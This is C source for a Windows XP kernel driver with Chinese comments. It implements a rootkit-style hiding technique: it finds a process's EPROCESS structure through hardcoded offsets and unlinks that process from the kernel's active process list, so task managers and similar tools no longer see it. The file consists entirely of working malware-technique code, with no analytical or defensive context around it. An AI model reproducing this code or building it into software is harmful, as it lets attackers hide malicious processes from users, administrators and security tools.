
```c
#include <ntddk.h>
#include <windef.h>
//我的是XP-SP2别的系统用WinDbg看一下EPROCESS的结构就行了
#define PIDOFFSET 0x84
#define FLINKOFFSET 0x88

PLIST_ENTRY pList_Org;
//////////////////////////////////////////////////////////////////////////
//根据PID得到进程的EPROCESS
//////////////////////////////////////////////////////////////////////////
DWORD FindProcessEPROCByID( int nPID )
{
    DWORD dwEProc     = 0x00000000;//要返回的EPROCESS结构的地址
    int nCurrentPID  = 0;
    int nStartPID    = 0;//起始ID
    int nCount     = 0;
    PLIST_ENTRY pList_Current;//当前线程的双链
    if ( 0 == nPID )
        return 0;
    dwEProc    = (DWORD)PsGetCurrentProcess();
    nStartPID   = *( ( int* )( dwEProc + PIDOFFSET ) );
    nCurrentPID = nStartPID;
    while( TRUE )
    {
        if ( nPID == nCurrentPID )
            return dwEProc;
        else if ( ( nCount > 0 ) && ( nStartPID == nCurrentPID) )
        {
            return 0x00000000;
        }
        else
        {
            pList_Current = ( PLIST_ENTRY )( dwEProc + FLINKOFFSET );//当前进程的LIST_ENTRY
            dwEProc      = (DWORD)pList_Current->Flink;//得到下一个进程的LIST_ENTRY地址
            dwEProc      = dwEProc - FLINKOFFSET;//得到当前进程的EPROCESS
            nCurrentPID   = *( (int*)( dwEProc + PIDOFFSET ) );//得到下一个进程的PID
            nCount++;
        }
    }
}
//////////////////////////////////////////////////////////////////////
//隐藏进程函数
//////////////////////////////////////////////////////////////////////
NTSTATUS HideProcess( )
{
    DWORD dwEProc = 0;
    PLIST_ENTRY pList_Current;
    //这里的1816就是在任务管理器中随便找的!
    dwEProc = FindProcessEPROCByID( 1816 );
    //没有的到地址
    if ( dwEProc == 0x00000000 )
    {
        return STATUS_INVALID_PARAMETER;
    }

    pList_Current = (PLIST_ENTRY)( dwEProc + FLINKOFFSET );
    pList_Org = pList_Current;
    *( (DWORD*)pList_Current->Blink )     = (DWORD)pList_Current->Flink;
    *( (DWORD*)pList_Current->Flink + 1 ) = (DWORD)pList_Current->Blink;
    pList_Current->Flink = (PLIST_ENTRY)&( pList_Current->Flink );
    pList_Current->Blink = (PLIST_ENTRY)&( pList_Current->Flink );
    return STATUS_SUCCESS;
}
//////////////////////////////////////////////////////////////////////////
//驱动卸载
//////////////////////////////////////////////////////////////////////////
NTSTATUS OnUnload( PDRIVER_OBJECT pDriverObj )
{
    DbgPrint( "Driver OnUnload! \n " );
    return STATUS_SUCCESS;
}
//////////////////////////////////////////////////////////////////////////
// 驱动加载
//////////////////////////////////////////////////////////////////////////
NTSTATUS DriverEntry( PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryString)
{
    NTSTATUS ntStatus;
    pDriverObj->DriverUnload = OnUnload;
    ntStatus = HideProcess();
    return ntStatus;
}
```
